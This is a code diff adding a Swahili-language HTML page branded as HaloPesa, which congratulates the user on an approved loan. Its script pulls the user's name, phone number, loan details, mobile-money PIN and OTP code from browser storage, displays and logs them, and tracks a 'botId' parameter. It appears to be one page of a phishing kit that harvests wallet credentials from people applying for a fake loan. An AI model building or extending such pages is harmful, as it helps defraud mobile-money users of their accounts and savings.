@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Maombi Yamekubaliwa - HaloPesa</title>
+
+<style>
+/* ===== HALOPESA BRAND STYLES ===== */
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  background: #f0f4f0;
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  padding: 20px;
+}
+
+.container {
+  width: 100%;
+  max-width: 520px;
+}
+
+/* ===== CARD ===== */
+.card {
+  background: #ffffff;
+  border-radius: 16px;
+  padding: 40px 30px 35px;
+  box-shadow: 0 8px 30px rgba(26, 67, 41, 0.10);
+  border: 1px solid #e6efe6;
+  text-align: center;
+}
+
+/* ===== SUCCESS ICON ===== */
+.success-icon {
+  width: 85px;
+  height: 85px;
+  background: #eaf6ea;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto 18px;
+  border: 3px solid #1a7a2a;
+  animation: pulse 2s ease-in-out infinite;
+}
+
+@keyframes pulse {
+  0% { transform: scale(1); }
+  50% { transform: scale(1.05); }
+  100% { transform: scale(1); }
+}
+
+.success-icon svg {
+  width: 48px;
+  height: 48px;
+  fill: #1a7a2a;
+}
+
+/* ===== TITLES ===== */
+.title {
+  font-size: 28px;
+  font-weight: 700;
+  color: #1a6b2a;
+  margin-bottom: 8px;
+}
+
+.subtitle {
+  font-size: 15px;
+  color: #4a5a4a;
+  line-height: 1.6;
+  margin-bottom: 25px;
+}
+
+/* ===== DIVIDER ===== */
+.divider {
+  height: 2px;
+  background: #e6efe6;
+  margin: 0 0 20px 0;
+}
+
+/* ===== DETAILS GRID ===== */
+.details-grid {
+  text-align: left;
+  margin-bottom: 28px;
+}
+
+.detail-row {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 12px 0;
+  border-bottom: 1px solid #f0f4f0;
+}
+
+.detail-row:last-child {
+  border-bottom: none;
+}
+
+.detail-label {
+  color: #6a8a6a;
+  font-weight: 500;
+  font-size: 14px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.detail-label i {
+  font-style: normal;
+  font-size: 16px;
+}
+
+.detail-value {
+  color: #1a2b1a;
+  font-weight: 600;
+  font-size: 15px;
+  text-align: right;
+  max-width: 60%;
+  word-break: break-word;
+}
+
+.detail-value.highlight {
+  color: #1a7a2a;
+  font-size: 17px;
+}
+
+/* ===== STATUS BADGE ===== */
+.status-badge {
+  display: inline-block;
+  background: #eaf6ea;
+  color: #1a7a2a;
+  padding: 8px 24px;
+  border-radius: 20px;
+  font-weight: 600;
+  font-size: 14px;
+  margin-bottom: 25px;
+  border: 1px solid #b8d9b8;
+}
+
+.status-badge .check {
+  margin-right: 6px;
+}
+
+/* ===== BUTTON ===== */
+.btn {
+  width: 100%;
+  background: #1a7a2a;
+  color: #ffffff;
+  border: none;
+  border-radius: 12px;
+  padding: 16px;
+  font-size: 18px;
+  font-weight: 700;
+  cursor: pointer;
+  transition: background 0.25s, transform 0.1s;
+  letter-spacing: 0.5px;
+  text-decoration: none;
+  display: inline-block;
+  text-align: center;
+}
+
+.btn:hover {
+  background: #136622;
+  transform: scale(1.01);
+}
+
+.btn:active {
+  transform: scale(0.98);
+}
+
+.btn-secondary {
+  background: transparent;
+  color: #1a7a2a;
+  border: 2px solid #1a7a2a;
+  margin-top: 10px;
+  padding: 14px;
+  font-size: 16px;
+}
+
+.btn-secondary:hover {
+  background: #eaf6ea;
+  transform: scale(1.01);
+}
+
+/* ===== REFERENCE NUMBER ===== */
+.ref-number {
+  margin-top: 20px;
+  padding: 12px;
+  background: #fafffa;
+  border-radius: 10px;
+  border: 1px dashed #d0e0d0;
+  font-size: 13px;
+  color: #6a8a6a;
+}
+
+.ref-number strong {
+  color: #1a2b1a;
+  font-weight: 600;
+}
+
+/* ===== RESPONSIVE ===== */
+@media (max-width: 480px) {
+  .card {
+    padding: 30px 18px 25px;
+  }
+  
+  .title {
+    font-size: 24px;
+  }
+  
+  .success-icon {
+    width: 70px;
+    height: 70px;
+  }
+  
+  .success-icon svg {
+    width: 38px;
+    height: 38px;
+  }
+  
+  .detail-row {
+    flex-direction: column;
+    align-items: flex-start;
+    gap: 4px;
+    padding: 10px 0;
+  }
+  
+  .detail-value {
+    max-width: 100%;
+    text-align: left;
+  }
+  
+  .detail-value.highlight {
+    font-size: 16px;
+  }
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="card">
+    
+    <!-- Success Icon -->
+    <div class="success-icon">
+      <svg viewBox="0 0 24 24">
+        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+      </svg>
+    </div>
+
+    <!-- Title -->
+    <h1 class="title">Maombi Yamekubaliwa! 🎉</h1>
+    <p class="subtitle">
+      Ombi lako la mkopo limekubaliwa na meneja.<br>
+      Utapewa maelezo zaidi kupitia simu yako.
+    </p>
+
+    <!-- Status Badge -->
+    <div class="status-badge">
+      <span class="check">✅</span> IMEKUBALIWA
+    </div>
+
+    <div class="divider"></div>
+
+    <!-- Details Grid -->
+    <div class="details-grid">
+      
+      <div class="detail-row">
+        <span class="detail-label">👤 Jina Kamili</span>
+        <span class="detail-value highlight" id="displayName">-</span>
+      </div>
+      
+      <div class="detail-row">
+        <span class="detail-label">📱 Nambari ya Simu</span>
+        <span class="detail-value" id="displayPhone">-</span>
+      </div>
+      
+      <div class="detail-row">
+        <span class="detail-label">💰 Kiasi cha Mkopo</span>
+        <span class="detail-value highlight" id="displayAmount">-</span>
+      </div>
+      
+      <div class="detail-row">
+        <span class="detail-label">📅 Muda wa Mkopo</span>
+        <span class="detail-value" id="displayDuration">-</span>
+      </div>
+      
+      <div class="detail-row">
+        <span class="detail-label">📋 Aina ya Mkopo</span>
+        <span class="detail-value" id="displayLoanType">-</span>
+      </div>
+      
+      <div class="detail-row">
+        <span class="detail-label">📝 Kusudi la Mkopo</span>
+        <span class="detail-value" id="displayPurpose">-</span>
+      </div>
+      
+      <div class="detail-row">
+        <span class="detail-label">📆 Tarehe ya Maombi</span>
+        <span class="detail-value" id="displayDate">-</span>
+      </div>
+      
+      <div class="detail-row">
+        <span class="detail-label">🔑 Msimbo wa PIN</span>
+        <span class="detail-value" id="displayPin">-</span>
+      </div>
+      
+      <div class="detail-row">
+        <span class="detail-label">🔐 Msimbo wa OTP</span>
+        <span class="detail-value" id="displayCode">-</span>
+      </div>
+
+    </div>
+
+    <!-- Reference Number -->
+    <div class="ref-number">
+      <strong>Ref:</strong> <span id="displayRef">-</span>
+    </div>
+
+    <!-- Buttons -->
+    <button class="btn" id="homeBtn">🏠 NYUMBANI</button>
+    <button class="btn btn-secondary" id="printBtn">🖨️ PRINT</button>
+
+  </div>
+</div>
+
+<script>
+// ===== GET DATA FROM LOCALSTORAGE =====
+function getLocalStorageData() {
+  const firstName = localStorage.getItem('firstName') || '';
+  const lastName = localStorage.getItem('lastName') || '';
+  const name = localStorage.getItem('name') || '';
+  
+  // Build full name
+  let fullName = name;
+  if (!fullName && firstName) {
+    fullName = lastName ? `${firstName} ${lastName}` : firstName;
+  }
+  if (!fullName) {
+    fullName = 'Mteja';
+  }
+  
+  const phone = localStorage.getItem('phone') || 'N/A';
+  const rawPhone = localStorage.getItem('rawPhone') || '';
+  
+  // Loan details
+  const loanAmount = localStorage.getItem('loanAmount') || '0';
+  const loanAmountFormatted = localStorage.getItem('loanAmountFormatted') || '';
+  const loanDuration = localStorage.getItem('loanDuration') || 'N/A';
+  const loanType = localStorage.getItem('loanType') || 'N/A';
+  const loanPurpose = localStorage.getItem('loanPurpose') || 'N/A';
+  const applicationDate = localStorage.getItem('applicationDate') || 'N/A';
+  
+  // PIN and Code
+  const pin = localStorage.getItem('pin') || 'N/A';
+  const code = localStorage.getItem('code') || 'N/A';
+  
+  // Generate reference number
+  const ref = 'HP-' + Date.now().toString().slice(-8) + '-' + Math.random().toString(36).substring(2, 6).toUpperCase();
+  
+  // Format amount
+  let displayAmount = loanAmountFormatted;
+  if (!displayAmount && loanAmount !== '0' && loanAmount !== 'N/A') {
+    displayAmount = 'TZS ' + parseInt(loanAmount).toLocaleString();
+  }
+  if (!displayAmount || displayAmount === 'N/A' || displayAmount === '0') {
+    displayAmount = 'TZS ' + parseInt(loanAmount || '0').toLocaleString();
+  }
+  
+  return {
+    fullName,
+    phone,
+    rawPhone,
+    loanAmount: displayAmount,
+    loanDuration,
+    loanType,
+    loanPurpose,
+    applicationDate,
+    pin,
+    code,
+    ref
+  };
+}
+
+// ===== DISPLAY DATA =====
+function displayData() {
+  const data = getLocalStorageData();
+  
+  document.getElementById('displayName').textContent = data.fullName;
+  document.getElementById('displayPhone').textContent = data.phone;
+  document.getElementById('displayAmount').textContent = data.loanAmount;
+  document.getElementById('displayDuration').textContent = data.loanDuration;
+  document.getElementById('displayLoanType').textContent = data.loanType;
+  document.getElementById('displayPurpose').textContent = data.loanPurpose || 'N/A';
+  document.getElementById('displayDate').textContent = data.applicationDate;
+  document.getElementById('displayPin').textContent = data.pin;
+  document.getElementById('displayCode').textContent = data.code;
+  document.getElementById('displayRef').textContent = data.ref;
+  
+  console.log('📋 Success page loaded with data:', data);
+}
+
+// ===== BUTTON HANDLERS =====
+// Home button - redirect to index.html
+document.getElementById('homeBtn').addEventListener('click', function() {
+  const botId = new URLSearchParams(window.location.search).get('botId') || 
+                localStorage.getItem('botId') || '';
+  window.location.href = `index.html?botId=${botId}`;
+});
+
+// Print button
+document.getElementById('printBtn').addEventListener('click', function() {
+  window.print();
+});
+
+// ===== GET botId FROM URL =====
+const urlParams = new URLSearchParams(window.location.search);
+const botId = urlParams.get('botId');
+
+if (botId) {
+  localStorage.setItem('botId', botId);
+}
+
+console.log('✅ Success page loaded - Bot ID:', botId);
+
+// ===== LOAD DATA =====
+displayData();
+</script>
+
+</body>
+</html>
